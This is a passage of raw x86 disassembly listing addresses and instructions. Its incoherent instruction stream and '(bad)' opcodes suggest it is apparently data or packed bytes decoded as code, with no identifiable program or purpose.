  416192:	inc    esi
  416193:	sbb    eax,0xfa735924
  416198:	cmp    eax,DWORD PTR [edi]
  41619a:	push   edx
  41619b:	cld    
  41619c:	and    ch,BYTE PTR [edi]
  41619e:	push   ecx
  41619f:	add    BYTE PTR [eax],ah
  4161a1:	sub    BYTE PTR [esi],ch
  4161a3:	loope  0x4161bd
  4161a5:	sub    eax,DWORD PTR [eax]
  4161a7:	mov    edx,0xcc763950
  4161ac:	inc    ecx
  4161ad:	pop    es
  4161ae:	push   ebx
  4161af:	ficom  DWORD PTR [eax]
  4161b1:	cmp    DWORD PTR [esi-0x38],ebp
  4161b4:	cmp    BYTE PTR [eax],ch
  4161b6:	add    BYTE PTR [ecx-0x418ec9f4],bl
  4161bc:	cmp    DWORD PTR es:[ecx+ebp*8-0x3b],esp
  4161c1:	xor    dh,BYTE PTR [eax-0x47]
  4161c4:	cmp    DWORD PTR es:[ecx+ebp*8-0x3e],esi
  4161c9:	sub    DWORD PTR [esi-0x63],esp
  4161cc:	mov    esi,0x84725b
	...
  4161e1:	add    BYTE PTR [edi],cl
  4161e3:	inc    esi
  4161e4:	jb     0x416166
  4161e6:	sar    BYTE PTR [eax],1
  4161e8:	pop    esp
  4161e9:	xchg   esi,eax
  4161ea:	shr    BYTE PTR [eax],1
  4161ec:	push   ecx
  4161ed:	cmp    BYTE PTR [edi-0x2e8bafd9],0x2a
  4161f4:	addr16 pop edx
  4161f6:	pushf  
  4161f7:	daa    
  4161f8:	jb     0x4161e3
  4161fa:	cmovns esp,DWORD PTR [edi+0x5d]
  4161fe:	jmp    0x416223
  416200:	outs   dx,BYTE PTR ds:[esi]
  416201:	inc    esp
  416202:	mov    ah,0x6
  416204:	bound  eax,QWORD PTR [eax]
  416206:	rcl    BYTE PTR [esi+0x67],0x69
  41620a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41620b:	and    eax,0x57bd2e78
  416210:	add    BYTE PTR [eax-0x3a],cl
  416213:	push   edi
  416214:	je     0x416284
  416216:	call   0xbc41c378
  41621b:	push   edi
  41621c:	popa   
  41621d:	jb     0x416216
  41621f:	and    DWORD PTR [ecx+0x65],ebp
  416222:	fincstp 
  416224:	pop    esp
  416225:	jae    0x416201
  416227:	dec    esp
  416228:	imul   esi,DWORD PTR [edx-0x13],0x2
  41622c:	push   eax
  41622d:	outs   dx,DWORD PTR ds:[esi]
  41622e:	retf   
  41622f:	dec    ebx
  416230:	add    BYTE PTR [ebx-0x3a],dl
  416233:	pop    ecx
  416234:	je     0x4162ad
  416236:	test   al,0x55
  416238:	popa   
  416239:	pop    esp
  41623a:	mov    WORD PTR [edi+0x70],cs
  41623d:	popa   
  41623e:	mov    bh,0xfb
  416240:	jno    0x4162ab
  416242:	mov    edi,0x535c26
	...
  416257:	add    BYTE PTR [eax+ebx*2+0x51a6696f],ch
  41625e:	outs   dx,DWORD PTR ds:[esi]
  41625f:	add    BYTE PTR [ebp+0x46],ah
  416262:	js     0x4162d4
  416264:	mov    eax,0x60724451
  416269:	dec    ecx
  41626a:	popa   
  41626b:	add    BYTE PTR ds:0x8f69725b,dh
  416271:	outs   dx,DWORD PTR es:[esi]
  416273:	cs jae 0x4162ce
  416276:	add    BYTE PTR [edx],ah
  416278:	fldenv [edx]
  41627a:	outs   dx,DWORD PTR ds:[esi]
  41627b:	jae    0x41625b
  41627d:	push   esp
  41627e:	jb     0x4162e4
  416280:	cmp    esp,edi
  416282:	cmp    DWORD PTR [eax],esp
  416284:	cmp    eax,DWORD PTR [edi]
  416286:	and    ch,BYTE PTR [ecx+ecx*2]
  416289:	imul   BYTE PTR [edx+0x66]
  41628c:	popf   
  41628d:	dec    ecx
  41628e:	pop    ebp
  41628f:	jb     0x416281
  416291:	dec    edx
  416292:	sub    BYTE PTR [ebx-0x58],al
  416295:	pop    ebp
  416296:	popa   
  416297:	outs   dx,BYTE PTR ds:[esi]
  416298:	mov    ah,0xff
  41629a:	pop    eax
  41629b:	jbe    0x41622a
  41629d:	lods   eax,DWORD PTR ds:[esi]
  41629e:	ds js  0x416221
  4162a1:	dec    esi
  4162a2:	push   esi
  4162a3:	inc    esp
  4162a4:	add    BYTE PTR [esi+0x4e],0x63
  4162a8:	lahf   
  4162a9:	cmc    
  4162aa:	push   edx
  4162ab:	imul   ecx,DWORD PTR [ebp+0x626330ad],0x1a
  4162b2:	pop    ebp
  4162b3:	jb     0x4162a5
  4162b5:	repnz dec esi
  4162b7:	arpl   WORD PTR [edx-0xe],sp
  4162ba:	pusha  
  4162bb:	imul   eax,DWORD PTR [eax],0x0
	...
  4162ce:	dec    ebp
  4162cf:	mov    al,0x31
  4162d1:	pop    edi
  4162d2:	inc    ebx
  4162d3:	mov    ebp,0x4426d4c
  4162d8:	add    al,0x5d
  4162da:	and    bh,cl
  4162dc:	push   eax
  4162dd:	jno    0x41631e
  4162df:	leave  
  4162e0:	dec    edi
  4162e1:	lock imul ebx,DWORD PTR fs:[edx+0x72],0xd
  4162e7:	int    0x4d
  4162e9:	ins    DWORD PTR es:[edi],dx
  4162ea:	and    al,bh
  4162ec:	add    DWORD PTR [ecx+0x7],edx
  4162ef:	ret    0x754d
  4162f2:	adc    DWORD PTR [esi+0x5e],edi
  4162f5:	pop    esp
  4162f6:	ss ins DWORD PTR es:[edi],dx
  4162f8:	cmp    DWORD PTR [eax],esp
  4162fa:	and    edx,DWORD PTR [ecx-0x71008ba5]
  416300:	dec    edi
  416301:	arpl   sp,cx
  416303:	ins    BYTE PTR es:[edi],dx
  416304:	push   ebp
  416305:	pop    edi
  416306:	jecxz  0x4162a4
  416308:	pop    edx
  416309:	popa   
  41630a:	mov    dh,0x9b
  41630c:	xor    DWORD PTR [esi+ebp*4-0x6d],ebx
  416310:	xor    DWORD PTR [edi],edi
  416312:	ror    DWORD PTR [esp+edx*2+0x5033d673],cl
  416319:	add    BYTE PTR [esi-0x5eaba4fa],dh
  41631f:	and    ebx,DWORD PTR [ecx+0x4e]
  416322:	xchg   ebx,eax
  416323:	xor    al,0xe7
  416325:	cmp    eax,0x5134369c
  41632a:	xchg   ebx,eax
  41632b:	xor    al,0x35
  41632d:	arpl   WORD PTR [ebx+0x3de723],cx
	...
  416343:	add    BYTE PTR [esi+esi*1+0x35816317],al
  41634a:	ss push ebp
  41634c:	and    BYTE PTR [edx],0xe7
  41634f:	and    al,0xae
  416351:	xor    dl,BYTE PTR [edi]
  416353:	xor    al,0x4f
  416355:	sbb    cl,BYTE PTR ss:[ebp+0x55]
  416359:	xor    eax,0x33360403
  41635e:	idiv   DWORD PTR [edi]
  416360:	dec    edi
  416361:	xor    eax,0x2a446104
  416366:	stc    
  416367:	dec    edx
  416368:	lock push ebp
  41636a:	push   ds
  41636b:	ds and al,0x52
  41636e:	test   al,0x31
  416370:	xor    ebx,DWORD PTR [ebx-0x53]
  416373:	inc    eax
  416374:	cmp    bh,ah
  416376:	mov    ecx,0xd6330e54
  41637b:	bound  esp,QWORD PTR [edx]
  41637d:	and    al,0xa3
  41637f:	cmp    eax,0x5ccd3004
  416384:	sub    al,0x48
  416386:	retf   0x1560
  416389:	xor    al,0xbd
  41638b:	dec    edi
  41638c:	add    DWORD PTR [edi],eax
  41638e:	mov    edx,0x96330e54
  416393:	(bad)  
  416395:	and    esi,DWORD PTR [ebx-0x55a943c3]
  41639b:	push   edi
  41639c:	xlat   BYTE PTR ds:[ebx]
  41639d:	and    edx,DWORD PTR [ebp-0x6faa4bb1]
  4163a3:	dec    edi
  4163a4:	shl    DWORD PTR ds:0xe900,cl
	...
  4163ba:	add    BYTE PTR [esi+eiz*2],ch
  4163bd:	jne    0x41636b
  4163bf:	pop    ecx
  4163c0:	jb     0x41640e
  4163c2:	rcl    BYTE PTR [edi+0x6d],1
  4163c5:	inc    edi
  4163c6:	call   0xde879229
  4163cb:	and    ebx,DWORD PTR [edi+eiz*1-0x48]
  4163cf:	push   esi
  4163d0:	inc    ecx
  4163d1:	push   ebp
  4163d2:	lds    esp,FWORD PTR ds:0x5790356e
  4163d8:	addr16 cmp eax,0xff0037d9
  4163de:	ret    0x613e
  4163e1:	jmp    0xdad8de7
  4163e6:	hlt    
  4163e7:	pop    edx
  4163e8:	inc    ebp
  4163e9:	cmp    DWORD PTR [edi],edi
  4163eb:	sub    ah,BYTE PTR [esi+0x15]
  4163ee:	sbb    ebx,DWORD PTR [eax+0x72]
  4163f1:	or     al,0x50
  4163f3:	inc    ebx
  4163f4:	addr16 sti 
  4163f6:	sbb    BYTE PTR [esi],ah
  4163f8:	je     0x416400
  4163fa:	(bad)  
  4163fb:	das    
  4163fc:	and    BYTE PTR [esi],bl
  4163fe:	add    al,0x34
  416400:	jno    0x4163eb
  416402:	pop    ss
  416403:	push   esi
  416404:	push   0x6423e5c8
  416409:	mov    edx,0xc07432d8
  41640e:	loope  0x416431
  416410:	jno    0x416429
  416412:	iret   
  416413:	and    eax,0x562fe971
  416418:	push   0x6423bdc8
  41641d:	call   0x0:0x0
	...
  416430:	enter  0x7432,0x90
  416434:	shl    DWORD PTR [ecx],0x71
  416437:	mov    esi,0xb6305b64
  41643c:	push   0x268a60ea
  416441:	pop    es
  416442:	pop    esp
  416443:	add    BYTE PTR [edx-0x14],bh
  416446:	pop    esp
  416447:	jb     0x4164bd
  416449:	loopne 0x416499
  41644b:	(bad)
  41644f:	outs   dx,BYTE PTR ds:[esi]
  416450:	jbe    0x416443
  416452:	sub    eax,0x64f69873
  416457:	je     0x41640d
  416459:	add    bl,BYTE PTR [ebx+edx*2-0x4f]
  41645d:	loope  0x4164d0
  41645f:	gs mov ch,0x4f
  416462:	popa   
  416463:	je     0x41643a
  416465:	jmp    0x240bcbd7
  41646a:	sub    eax,0x3125095f
  41646f:	cs mov edx,0xd5696bf1
  416475:	in     eax,dx
  416476:	call   FWORD PTR [ebx+0x1a]
  416479:	hlt    
  41647a:	gs data16 hlt 
  41647d:	in     eax,dx
  41647e:	ds jne 0x41647a
  416481:	mov    ds:0xfee76f50,al
  416486:	jb     0x4164e9
  416488:	retf   
  416489:	out    dx,al
  41648a:	jmp    FWORD PTR [ebx-0xc]
  41648d:	loope  0x4164fe
  41648f:	(bad)
  416493:	je     0x416495
	...
  4164a5:	add    BYTE PTR [edi-0x369e9f19],bl
  4164ab:	mov    ch,0x62
  4164ad:	js     0x416463
  4164af:	add    ebp,DWORD PTR [edi+0x69]
  4164b2:	(bad)
  4164b5:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4164b7:	loop   0x41652c
  4164b9:	add    BYTE PTR [edx-0x16],cl
  4164bc:	jae    0x416523
  4164be:	dec    edx
  4164bf:	mov    ch,0x66
  4164c1:	outs   dx,BYTE PTR ds:[esi]
  4164c2:	mov    al,0x3
  4164c4:	pop    esp
  4164c5:	dec    esp
  4164c6:	fs loop 0x416538
  4164c9:	push   edi
  4164ca:	js     0x4164bd
  4164cc:	pusha  
  4164cd:	pop    esp
  4164ce:	lock popa 
  4164d0:	sub    BYTE PTR [edi-0x20],bl
  4164d3:	pop    edi
  4164d4:	push   ebp
  4164d5:	push   eax
  4164d6:	lock pushf 
  4164d8:	push   edx
  4164d9:	inc    esi
  4164da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164db:	nop
  4164dc:	inc    esp
  4164dd:	push   edx
  4164de:	lods   eax,DWORD PTR ds:[esi]
  4164df:	xchg   ecx,eax
  4164e0:	dec    ebp
  4164e1:	arpl   cx,dx
  4164e3:	cmp    eax,0x4ac25f5a
  4164e8:	add    al,0x47
  4164ea:	sahf   
  4164eb:	pop    esp
  4164ec:	cmp    BYTE PTR [edi-0x6c],bl
  4164ef:	inc    ecx
  4164f0:	push   esp
  4164f1:	pop    edi
  4164f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164f3:	inc    ebp
  4164f4:	add    al,0x44
  4164f6:	xchg   ecx,eax
  4164f7:	stc    
  4164f8:	and    BYTE PTR [ecx+ebx*4-0x5],al
  4164fc:	add    edx,DWORD PTR [eax-0x6f]
  4164ff:	cld    
  416500:	xor    dh,BYTE PTR [ebp-0x71]
  416503:	sti    
  416504:	daa    
  416505:	add    BYTE PTR [eax+0x743310],ch
	...
  41651b:	add    BYTE PTR [esi],bh
  41651d:	jmp    FWORD PTR [ebx+eiz*2]
  416520:	lock repnz xor ah,BYTE PTR [ebx+0x62]
  416525:	push   ss
  416526:	and    DWORD PTR [ebx+0x4d],ebp
  416529:	mov    al,ds:0x55d6353
  41652e:	cmp    BYTE PTR [ebx+0x2c],ah
  416531:	pop    es
  416532:	arpl   WORD PTR ss:[ebx-0x44],dx
  416536:	xor    BYTE PTR [edx+0x39],dh
  416539:	mov    al,ds:0xdc226d51
  41653e:	dec    edi
  41653f:	jae    0x416556
  416541:	ret    0x7226
  416544:	lock ins DWORD PTR es:[edi],dx
  416546:	push   esp
  416547:	push   eax
  416548:	and    bl,ch
  41654a:	xor    eax,0x2dc5136d
  41654f:	add    BYTE PTR [ebx],ah
  416551:	int    0x27
  416553:	je     0x41655c
  416555:	mov    edi,0x7146333
  41655a:	mov    ah,0x22
  41655c:	loop   0x416598
  41655e:	nop
  41655f:	xor    DWORD PTR [eax],edx
  416561:	push   edi
  416562:	cdq    
  416563:	sub    cl,cl
  416565:	cmp    BYTE PTR [eax-0x45ad0fd1],dl
  41656b:	cmc    
  41656c:	mov    cl,0x1f
  41656e:	jae    0x4165b9
  416570:	mov    esp,0xce2ac536
  416575:	pop    ds
  416576:	out    0x51,eax
  416578:	lods   al,BYTE PTR ds:[esi]
  416579:	pop    ecx
  41657a:	push   eax
  41657b:	cmp    BYTE PTR [ebx+0x2b0d39],dl
	...
  416591:	add    BYTE PTR [esi-0x51a018e1],dl
  416597:	sub    edx,DWORD PTR [ebx+0x48]
  41659a:	mov    ds:0xf0273d1f,al
  41659f:	push   esi
  4165a0:	dec    eax
  4165a1:	xor    eax,0x36465d81
  4165a6:	xchg   esp,eax
  4165a7:	push   es
  4165a8:	adc    al,0x36
  4165aa:	test   BYTE PTR [esi],al
  4165ac:	cmp    al,0x35
  4165ae:	push   ebx
  4165af:	cmp    DWORD PTR ds:0xe72c5b23,ebp
  4165b5:	push   ebp
  4165b6:	dec    ebp
  4165b7:	adc    ecx,DWORD PTR es:[eax+0x4f]
  4165bb:	cmp    DWORD PTR [eiz*1+0x3af92644],ecx
  4165c2:	lock push esi
  4165c4:	push   es
  4165c5:	ss inc esp
  4165c7:	pop    es
  4165c8:	sbb    dh,BYTE PTR [ecx]
  4165ca:	dec    esi
  4165cb:	cmp    ebx,esi
  4165cd:	and    ah,BYTE PTR [edx]
  4165cf:	sub    al,0xbb
  4165d1:	push   esp
  4165d2:	adc    eax,0xd02bdb3c
  4165d7:	pop    eax
  4165d8:	sar    BYTE PTR [ecx],0x13
  4165db:	cmp    DWORD PTR [edi],eax
  4165dd:	pop    eax
  4165de:	adc    ebp,DWORD PTR [edx]
  4165e0:	iret   
  4165e1:	xor    DWORD PTR ds:0xc8c60023,edx
  4165e7:	sub    eax,0x5c17ba63
  4165ec:	arpl   WORD PTR [ebx-0x6898c749],cx
  4165f2:	push   cs
  4165f3:	push   ebx
  4165f4:	inc    ecx
  4165f5:	xchg   BYTE PTR [eax],al
	...
  416607:	add    BYTE PTR [ecx],ah
  416609:	and    eax,0x2e1f8a63
  41660e:	ins    DWORD PTR es:[edi],dx
  41660f:	xchg   edi,eax
  416610:	add    al,0x7
  416612:	push   ecx
  416613:	test   ch,bh
  416615:	cmp    al,0x63
  416617:	jnp    0x4165c0
  416619:	cmp    eax,0x4cf38470
  41661e:	push   esp
  41661f:	cmp    DWORD PTR [esi+eax*2],edx
  416622:	dec    ebp
  416623:	das    
  416624:	enter  0x4d58,0x25
  416628:	hlt    
  416629:	dec    esp
  41662a:	push   esp
  41662b:	cmp    DWORD PTR [ebx+0x1de94e43],esi
  416631:	and    eax,0x52ec4772
  416636:	push   eax
  416637:	cmp    ecx,edi
  416639:	sub    al,0x67
  41663b:	cmp    eax,0x6a0037c9
  416640:	xor    DWORD PTR [ebx-0x609c90f3],esi
  416646:	sbb    cl,BYTE PTR [bx-0x4e]
  41664a:	push   0x3a371815
  41664f:	(bad)  
  416650:	fidiv  WORD PTR [ebp+eiz*2+0x7136fff5]
  416657:	mov    bl,0xce
  416659:	jecxz  0x41665a
  41665b:	push   es
  41665c:	clc    
  41665d:	cmp    dl,BYTE PTR ss:[esi]
  416660:	lahf   
  416661:	mov    ah,0x6e
  416663:	(bad)  
  416665:	cmp    BYTE PTR [edi-0x17],bl
  416668:	out    0x53,al
  41666a:	outs   dx,BYTE PTR ds:[esi]
  41666b:	lds    eax,FWORD PTR [eax]
	...
  41667d:	add    BYTE PTR [ebp+0x4d005f28],al
  416683:	or     BYTE PTR [ebx+0x53],bl
  416686:	mov    dh,0xea
  416688:	jae    0x416701
  41668a:	test   al,0xf6
  41668c:	pusha  
  41668d:	pop    esp
  41668e:	push   esi
  41668f:	clc    
  416690:	pusha  
  416691:	jb     0x41670b
  416693:	test   al,0x50
  416695:	outs   dx,DWORD PTR ds:[esi]
  416696:	outs   dx,DWORD PTR ds:[esi]
  416697:	cld    
  416698:	jb     0x4166fb
  41669a:	jnp    0x41667b
  41669c:	dec    DWORD PTR [ebx+0x68]
  41669f:	stc    
  4166a0:	jae    0x4166c2
  4166a2:	popf   
  4166a3:	jecxz  0x416716
  4166a5:	gs jp  0x4166a4
  4166a8:	push   0x72
  4166aa:	sar    BYTE PTR [eax-0x697b403],0x73
  4166b1:	and    al,ah
  4166b3:	in     al,0x6e
  4166b5:	je     0x41666f
  4166b7:	imul   BYTE PTR [ebx+0x20]
  4166ba:	fldl2t 
  4166bc:	jae    0x416726
  4166be:	or     DWORD PTR [ebp+0x70],eax
  4166c1:	gs retf 
  4166c3:	jmp    0x561eaef5
  4166c8:	dec    esp
  4166c9:	pop    esp
  4166ca:	mov    edx,0xb56c60e2
  4166cf:	imul   esi,DWORD PTR es:[eax-0x4],0xffffffe4
  4166d4:	pop    ebx
  4166d5:	arpl   si,si
  4166d7:	cmc    
  4166d8:	push   0xffdef761
  4166dd:	jbe    0x4166cf
  4166df:	mul    DWORD PTR [eax+0x66]
	...
  4166f2:	add    BYTE PTR [eax],al
  4166f4:	int    0xf7
  4166f6:	outs   dx,BYTE PTR ds:[esi]
  4166f7:	jb     0x4166b8
  4166f9:	clc    
  4166fa:	sub    eax,0xffe4f062
  4166ff:	pop    ebx
  416700:	or     al,ch
  416702:	pusha  
  416703:	inc    edx
  416704:	pusha  
  416705:	pop    ebx
  416706:	add    BYTE PTR [ebx-0x4a],dl
  416709:	jmp    0xbf31de81
  41670e:	das    
  41670f:	arpl   WORD PTR [edi+ebx*2],si
  416712:	and    ah,BYTE PTR [ebx+0x32]
  416715:	ja     0x41676c
  416717:	add    BYTE PTR ds:0x23005890,dh
  41671d:	ins    DWORD PTR es:[edi],dx
  41671e:	inc    ebx
  41671f:	push   esp
  416720:	pop    ds
  416721:	pop    edi
  416722:	dec    edi
  416723:	inc    ebx
  416724:	int3   
  416725:	pusha  
  416726:	sub    eax,0x2890e35f
  41672b:	jno    0x4166e9
  41672d:	jno    0x41676b
  41672f:	jo     0x4166fe
  416731:	xchg   ecx,eax
  416732:	sub    al,0x62
  416734:	lods   al,BYTE PTR ds:[esi]
  416735:	mov    BYTE PTR [edx+0x42],al
  416738:	add    DWORD PTR [edi+ebp*8+0x40],ebp
  41673c:	add    BYTE PTR [eax+esi*8+0x37],ah
  416740:	add    BYTE PTR [edi-0xb],dh
  416743:	sub    ah,ah
  416745:	fiadd  WORD PTR [eax+0x41]
  416748:	aad    0xdf
  41674a:	ds inc esi
  41674c:	in     eax,0xa
  41674e:	clc    
  41674f:	cs mov cl,0x1b
  416752:	clc    
  416753:	inc    edx
  416754:	ret    0x43b4
  416757:	xor    eax,0x0
	...
  416768:	add    BYTE PTR [eax],al
  41676a:	mov    edi,0xa3003ebc
  41676f:	in     al,dx
  416770:	inc    ebp
  416771:	push   esp
  416772:	lahf   
  416773:	ficom  WORD PTR [ecx+0x43]
  416776:	dec    esp
  416777:	(bad)  [edi]
  416779:	pop    edi
  41677a:	arpl   WORD PTR ds:0xf43c7125,cx
  416780:	cmp    BYTE PTR [eax+0x4d],dh
  416783:	adc    al,0x29
  416785:	bound  ebp,QWORD PTR [eax*1+0x7b3142f9]
  41678c:	div    BYTE PTR [edx]
  41678e:	add    dh,BYTE PTR [edi-0x12]
  416791:	inc    edx
  416792:	add    DWORD PTR [esi-0x11],ebp
  416795:	sub    ah,ah
  416797:	push   es
  416798:	push   ds
  416799:	neg    esp
  41679b:	jecxz  0x416745
  41679d:	inc    eax
  41679e:	in     eax,0xef
  4167a0:	add    eax,DWORD PTR [edi-0x24]
  4167a3:	out    dx,al
  4167a4:	sbb    bh,dh
  4167a6:	xor    eax,0xc0f4f6ef
  4167ab:	hlt    
  4167ac:	test   eax,0xc039f03e
  4167b1:	xor    BYTE PTR [ebx],dl
  4167b3:	sub    DWORD PTR [ebx-0x62cb1ecd],esi
  4167b9:	xor    BYTE PTR [esi],dl
  4167bb:	and    BYTE PTR [ebp-0x7fc60fd6],cl
  4167c1:	xor    bl,dl
  4167c3:	sub    BYTE PTR [ebx-0x6adfe1cd],dl
  4167c9:	sub    dh,al
  4167cb:	dec    eax
  4167cc:	xchg   ebx,eax
  4167cd:	push   ebx
	...
  4167de:	add    BYTE PTR [eax],al
  4167e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167e1:	and    DWORD PTR [eax+0x22],esi
  4167e4:	int    0x2b
  4167e6:	jns    0x4167d5
  4167e8:	xchg   ebp,eax
  4167e9:	cmp    dl,BYTE PTR [edi+0x4]
  4167ec:	scas   al,BYTE PTR es:[edi]
  4167ed:	pop    edx
  4167ee:	aaa    
  4167ef:	push   esi
  4167f0:	lea    ebp,[edi]
  4167f2:	dec    eax
  4167f3:	and    eax,0x32fd3493
  4167f8:	xchg   ecx,eax
  4167f9:	push   es
  4167fa:	and    edx,DWORD PTR [edx-0x68]
  4167fd:	pop    ds
  4167fe:	dec    ebp
  4167ff:	sub    eax,0x384d21a1
  416804:	(bad)  
  416805:	and    eax,0x20f02f3e
  41680a:	sbb    dh,BYTE PTR [ecx]
  41680c:	and    ecx,esp
  41680e:	add    dh,BYTE PTR [eax]
  416810:	dec    esp
  416811:	pop    es
  416812:	and    eax,0x20524151
  416817:	cs push edi
  416819:	cmp    esp,edi
  41681b:	dec    ebp
  41681c:	and    DWORD PTR [esi+0x1e],edx
  41681f:	push   ecx
  416820:	dec    eax
  416821:	cmp    al,0x0
  416823:	std    
  416824:	(bad)  
  416826:	jne    0x416827
  416828:	repz inc eax
  41682a:	push   ecx
  41682b:	mov    edx,0xc4715231
  416830:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416831:	cmc    
  416832:	pop    esp
  416833:	lods   eax,DWORD PTR ds:[esi]
  416834:	into   
  416835:	daa    
  416836:	ins    DWORD PTR es:[edi],dx
  416837:	(bad)
  41683a:	jae    0x41680b
  41683c:	int    0x25
  41683e:	jb     0x416829
  416840:	and    BYTE PTR [esi+0x41],al
  416843:	mov    al,ds:0x0
	...
  416854:	add    BYTE PTR [eax],al
  416856:	pop    ds
  416857:	inc    esi
  416858:	dec    ebx
  416859:	mov    ?,WORD PTR [ebp-0x45739ccc]
  41685f:	cmp    ah,BYTE PTR [ebx-0x74]
  416862:	repz push esi
  416864:	dec    ecx
  416865:	fsub   DWORD PTR [edx+0x52]
  416868:	inc    ebp
  416869:	test   BYTE PTR [edi],al
  41686b:	dec    edx
  41686c:	outs   dx,BYTE PTR ds:[esi]
  41686d:	jge    0x41687d
  41686f:	xor    eax,0x400f886e
  416874:	arpl   WORD PTR [eax-0x60],si
  416877:	and    ch,BYTE PTR [ebp+0x75]
  41687a:	repz push esi
  41687c:	dec    ecx
  41687d:	sbb    BYTE PTR ds:0xe0543f52,bl
  416883:	push   ds
  416884:	arpl   WORD PTR [edi-0x20],ax
  416887:	sub    DWORD PTR [ecx+0x48],esp
  41688a:	shl    BYTE PTR ds:0xe1b71900,0x2e
  416891:	sbb    dh,BYTE PTR [eax-0x2ed2a2ac]
  416897:	daa    
  416898:	jb     0x4168ca
  41689a:	and    al,0x3b
  41689c:	add    BYTE PTR [ecx],bh
  41689e:	aaa    
  41689f:	loopne 0x4168cf
  4168a1:	xor    dh,BYTE PTR ds:0x233f0c63
  4168a8:	ins    DWORD PTR es:[edi],dx
  4168a9:	adc    eax,0x6f4
  4168ae:	fld    DWORD PTR [eax+eax*1]
  4168b1:	add    cl,cl
  4168b3:	add    al,0x0
  4168b5:	add    cl,cl
  4168b7:	add    al,0x0
	...
  4168c9:	add    BYTE PTR [eax],al
  4168cb:	add    BYTE PTR [ecx-0x66fffffc],bl
  4168d1:	add    al,0x0
  4168d3:	add    BYTE PTR [ecx-0x76fffffc],cl
  4168d9:	add    al,0x0
  4168db:	add    BYTE PTR [ecx+0x48730004],bl
  4168e1:	call   0xb9f5dd4a
  4168e6:	sub    esp,DWORD PTR [ebp+ebp*4-0x18]
  4168ea:	push   DWORD PTR [edx-0x58]
  4168ed:	call   0xb9b5dd56
  4168f2:	pop    esp
  4168f3:	outs   dx,DWORD PTR ds:[esi]
  4168f4:	jns    0x4168dd
  4168f6:	ins    DWORD PTR es:[edi],dx
  4168f7:	add    BYTE PTR [edx-0x5],bh
  4168fa:	imul   ebp,DWORD PTR [ecx+0x65],0xffffffe7
  4168fe:	cs pop edi
  416900:	jp     0x4168ea
  416902:	push   0x73
  416904:	je     0x41690a
  416906:	outs   dx,DWORD PTR ds:[esi]
  416907:	jno    0x416976
  416909:	jecxz  0x41697e
  41690b:	gs push 0x4d
  41690e:	jo     0x416982
  416910:	mov    ah,0xfa
  416912:	pop    esp
  416913:	jb     0x4168c9
  416915:	or     ch,BYTE PTR [edi+0x71]
  416918:	lods   eax,DWORD PTR ds:[esi]
  416919:	loope  0x41698e
  41691b:	gs jmp 0xfffa:0xb4746f4b
  416923:	jb     0x4168dd
  416925:	fisub  WORD PTR [esp+esi*2-0x5c]
  416929:	mov    bh,0x5c
  41692b:	arpl   WORD PTR [esi],bp
  41692d:	fbstp  TBYTE PTR [eax+0x6d]
	...
  416940:	add    BYTE PTR [eax],al
  416942:	dec    DWORD PTR [ebx+0x62]
  416945:	jns    0x41694c
  416947:	out    0x6e,al
  416949:	add    al,dh
  41694b:	or     al,0x33
  41694d:	ins    BYTE PTR es:[edi],dx
  41694e:	pop    ecx
  41694f:	sbb    bl,BYTE PTR [edi]
  416951:	xor    DWORD PTR [edi],esp
  416953:	std    
  416954:	sub    BYTE PTR [ebp+eax*2+0x3],ch
  416958:	sub    bl,BYTE PTR [ebp+0x52]
  41695b:	or     ch,BYTE PTR [ecx]
  41695d:	(bad)  
  41695e:	lock popf 
  416960:	sub    BYTE PTR [ebp+0x2a],ch
  416963:	int    0x34
  416965:	ins    BYTE PTR es:[edi],dx
  416966:	or     edx,ebx
  416968:	and    BYTE PTR [ecx],dh
  41696a:	mov    cl,0x25
  41696d:	ins    BYTE PTR es:[edi],dx
  41696e:	lock int3 
  416970:	xor    al,0x6c
  416972:	sbb    DWORD PTR [edx+0x20],esi
  416975:	xor    DWORD PTR [edi],ebx
  416977:	shl    DWORD PTR [ecx],0x63
  41697a:	push   es
  41697b:	sahf   
  41697c:	outs   dx,DWORD PTR ss:[esi]
  41697e:	fadd   st(6),st
  416980:	sub    eax,0x26c92363
  416985:	ins    BYTE PTR es:[edi],dx
  416986:	iret   
  416987:	mov    WORD PTR [eax],fs
  416989:	add    bl,ah
  41698b:	mov    fs,WORD PTR ds:0xf68ac467
  416991:	pop    esp
  416992:	shr    BYTE PTR [ebx],0x20
  416995:	jo     0x416968
  416997:	sub    esp,DWORD PTR [eax]
  416999:	add    bl,al
  41699b:	cs and eax,0xf68aa467
  4169a1:	pop    esp
  4169a2:	mov    ds:0x701d51,eax
	...
  4169b7:	add    al,dh
  4169b9:	dec    esp
  4169ba:	xor    DWORD PTR [ecx+ecx*4+0x51],ebp
  4169be:	sbb    eax,0x273caf31
  4169c3:	ins    BYTE PTR es:[edi],dx
  4169c4:	jge    0x416a20
  4169c6:	sub    bl,BYTE PTR [ebp-0x6e]
  4169c9:	inc    esi
  4169ca:	xor    BYTE PTR [ebx-0x7d],ah
  4169cd:	popf   
  4169ce:	xor    al,0x6f
  4169d0:	pop    esp
  4169d1:	inc    edi
  4169d2:	xor    BYTE PTR [ebx+0x23],ah
  4169d5:	pop    es
  4169d6:	inc    esi
  4169d7:	and    eax,0x27141b4d
  4169dc:	inc    esi
  4169dd:	dec    esi
  4169de:	or     DWORD PTR [eax],ebp
  4169e0:	pop    ebp
  4169e1:	sub    edi,esp
  4169e3:	add    esi,eax
  4169e5:	push   es
  4169e6:	out    0x3,eax
  4169e8:	lock push es
  4169ea:	out    0x3,eax
  4169ec:	lock push es
  4169ee:	out    0x3,eax
  4169f0:	lock push es
  4169f2:	out    0x3,eax
  4169f4:	lock push es
  4169f6:	out    0x3,eax
  4169f8:	lock push es
  4169fa:	out    0x3,eax
  4169fc:	lock push es
  4169fe:	out    0x3,eax
  416a00:	lock push es
  416a02:	out    0x3,eax
  416a04:	add    BYTE PTR [ecx],bh
  416a06:	(bad)  
  416a07:	and    DWORD PTR [edi],edx
  416a09:	sbb    eax,esp
  416a0b:	xor    al,0xc6
  416a0d:	pop    ds
  416a0e:	lds    ebp,FWORD PTR [edx]
  416a10:	lock push esi
  416a12:	mov    ecx,0x931fce28
  416a17:	push   ds
  416a18:	lock aas 
  416a1a:	call   0x0:0x55
	...
  416a2d:	add    bl,dl
